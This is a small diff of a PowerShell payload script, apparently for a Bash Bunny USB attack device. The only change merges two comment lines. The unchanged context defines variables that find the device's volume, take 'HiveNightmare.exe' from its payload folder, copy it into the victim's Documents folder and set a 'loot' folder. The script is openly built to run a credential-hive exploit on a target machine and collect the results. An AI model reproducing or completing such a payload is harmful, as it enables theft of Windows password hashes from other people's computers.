@@ -6,8 +6,7 @@
 
 #VARIABLES
 $mytemp = [environment]::getfolderpath(“mydocuments”)
-#Edit Source to fit your Switch
-#Switch1-2 is used instead of Tools as the file has to be copied localy
+#Edit Source to fit your Switch. Switch1-2 is used instead of Tools as the file has to be copied localy
 $source = @((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\switch1\HiveNightmare.exe')
 $destination = "$mytemp\hive"
 $loot = @((gwmi win32_volume -f 'label=''BashBunny''').Name+'loot\')
